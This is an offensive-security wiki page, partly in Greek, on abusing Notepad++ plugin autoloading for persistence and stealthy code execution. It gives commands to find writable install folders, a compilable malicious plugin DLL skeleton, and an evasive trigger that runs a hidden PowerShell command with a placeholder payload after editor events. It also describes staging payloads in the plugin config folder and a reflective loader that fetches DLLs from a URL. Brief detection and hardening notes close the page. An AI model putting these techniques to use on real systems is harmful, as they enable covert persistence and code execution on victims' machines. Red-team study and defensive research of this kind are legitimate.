# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Το Notepad++ θα **autoload κάθε plugin DLL που βρίσκεται κάτω από τους `plugins` υποφακέλους** του κατά την εκκίνηση. Η τοποθέτηση ενός malicious plugin σε οποιαδήποτε **writable Notepad++ installation** δίνει code execution μέσα στο `notepad++.exe` κάθε φορά που ξεκινά ο editor, κάτι που μπορεί να αξιοποιηθεί για **persistence**, stealthy **initial execution**, ή ως **in-process loader** αν ο editor εκκινεί elevated.

Από το **Notepad++ 7.6+** η αναμενόμενη manual-install διάταξη είναι **ένας υποφάκελος ανά plugin** (`plugins\<PluginName>\<PluginName>.dll`). Σε **portable mode** (παρουσία του `doLocalConf.xml` δίπλα στο `notepad++.exe`), ολόκληρο το application tree παραμένει τοπικά σε αυτόν τον κατάλογο, κάτι που συχνά μετατρέπει copied/admin tool bundles σε ένα εύκολο user-writable execution surface.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (συνήθως απαιτεί admin για write).
- Writable options for low-privileged operators:
- Use the **portable Notepad++ build** σε έναν user-writable φάκελο.
- Αντέγραψε το `C:\Program Files\Notepad++` σε ένα user-controlled path (π.χ. `%LOCALAPPDATA%\npp\`) και τρέξε το `notepad++.exe` από εκεί.
- Ψάξε για **admin tool bundles**, extracted zip copies, ή help-desk toolkits που ήδη περιέχουν `doLocalConf.xml` και βρίσκονται εκτός `Program Files`.
- Κάθε plugin παίρνει τον δικό του υποφάκελο κάτω από το `plugins` και φορτώνεται αυτόματα στο startup· τα menu entries εμφανίζονται κάτω από το **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Σημεία φόρτωσης plugin (execution primitives)
Το Notepad++ αναμένει συγκεκριμένες **exported functions**. Όλες αυτές καλούνται κατά το initialization, δίνοντας πολλαπλά surfaces εκτέλεσης:
- **`DllMain`** — εκτελείται αμέσως στο DLL load (πρώτο execution point).
- **`setInfo(NppData)`** — καλείται μία φορά στο load για να δώσει Notepad++ handles· τυπικό σημείο για να καταχωρηθούν menu items.
- **`getName()`** — επιστρέφει το όνομα του plugin που εμφανίζεται στο menu.
- **`getFuncsArray(int *nbF)`** — επιστρέφει menu commands· ακόμα κι αν είναι άδειο, καλείται κατά το startup.
- **`beNotified(SCNotification*)`** — λαμβάνει Notepad++ / Scintilla events (χρήσιμο για να καθυστερήσουν payloads μέχρι ένα user action ή editor event).
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler, χρήσιμο για μεγαλύτερες ανταλλαγές data.
- **`isUnicode()`** — compatibility flag που ελέγχεται στο load.

Τα περισσότερα exports μπορούν να υλοποιηθούν ως **stubs**· η εκτέλεση μπορεί να γίνει από το `DllMain` ή από οποιοδήποτε callback παραπάνω κατά το autoload.

## Minimal malicious plugin skeleton
Compile a DLL with the expected exports and place it in `plugins\\MyNewPlugin\\MyNewPlugin.dll` under a writable Notepad++ folder:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Build the DLL (Visual Studio/MinGW).
2. Create the plugin subfolder under `plugins` and drop the DLL inside.
3. Restart Notepad++; the DLL is loaded automatically, executing `DllMain` and subsequent callbacks.

## Low-noise trigger pattern via `beNotified`
For OPSEC, many payloads should **not** fire from `DllMain`. A quieter pattern is to let the plugin load cleanly, then execute only after a realistic editor event such as **startup complete**, **buffer activation**, or the **first typed character**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Αυτό ταιριάζει καλύτερα με δημόσια offensive research από ένα noisy `DllMain` beacon: το DLL εξακολουθεί να autoloaded κατά την εκκίνηση, αλλά η κακόβουλη ενέργεια καθυστερεί μέχρι το Notepad++ να φαίνεται ότι χρησιμοποιείται πραγματικά.

## Using the plugin config directory as secondary storage
Το Notepad++ εκθέτει το `NPPM_GETPLUGINSCONFIGDIR`, το οποίο επιστρέφει τον **plugin configuration directory του τρέχοντος χρήστη**. Ένα malicious plugin μπορεί να το χρησιμοποιήσει για να κρατά το on-disk DLL minimal ενώ αποθηκεύει encrypted config, staged payloads ή tasking files σε ένα path που δένει με τη συνηθισμένη plugin state.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Λειτουργικά αυτό είναι χρήσιμο όταν θέλεις:
- ένα μικροσκοπικό autoloaded bootstrap DLL;
- per-user tasking χωρίς να αγγίξεις ξανά το κύριο plugin binary;
- να διαχωρίσεις το **autoload trigger** από το πιο βαρύ δεύτερο στάδιο.

## Reflective loader plugin pattern
Ένα weaponized plugin μπορεί να μετατρέψει το Notepad++ σε **reflective DLL loader**:
- Παρουσίασε ένα minimal UI/menu entry (π.χ., "LoadDLL").
- Δέξου μια **file path** ή **URL** για να ανακτήσεις ένα payload DLL.
- Reflectively map το DLL μέσα στην τρέχουσα process και κάλεσε ένα exported entry point (π.χ., μια loader function μέσα στο fetched DLL).
- Πλεονέκτημα: επαναχρησιμοποίηση ενός benign-looking GUI process αντί να εκκινήσεις έναν νέο loader· το payload κληρονομεί την integrity του `notepad++.exe` (συμπεριλαμβανομένων elevated contexts).
- Trade-offs: η τοποθέτηση ενός **unsigned plugin DLL** στο disk είναι θορυβώδης· μια πρακτική παραλλαγή είναι να χρησιμοποιείς το autoloaded plugin μόνο ως stub και να κρατάς το πραγματικό implant encrypted/staged αλλού.

## Detection and hardening notes
- Block ή monitor **writes to Notepad++ plugin directories** (συμπεριλαμβανομένων portable copies σε user profiles); ενεργοποίησε controlled folder access ή application allowlisting.
- Alert σε **new unsigned DLLs** κάτω από `plugins`, αλλαγές σε portable Notepad++ trees, και ασυνήθιστη **child processes/network activity** από το `notepad++.exe`.
- Baseline τα legitimate plugins και διερεύνησε οποιοδήποτε νέο DLL που εξάγει το κανονικό Notepad++ plugin interface αλλά επίσης εκκινεί shells, PowerShell, ή network beacons.
- Εφάρμοσε εγκατάσταση plugin μόνο μέσω **Plugins Admin**, και περιόρισε την εκτέλεση portable copies από untrusted paths.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
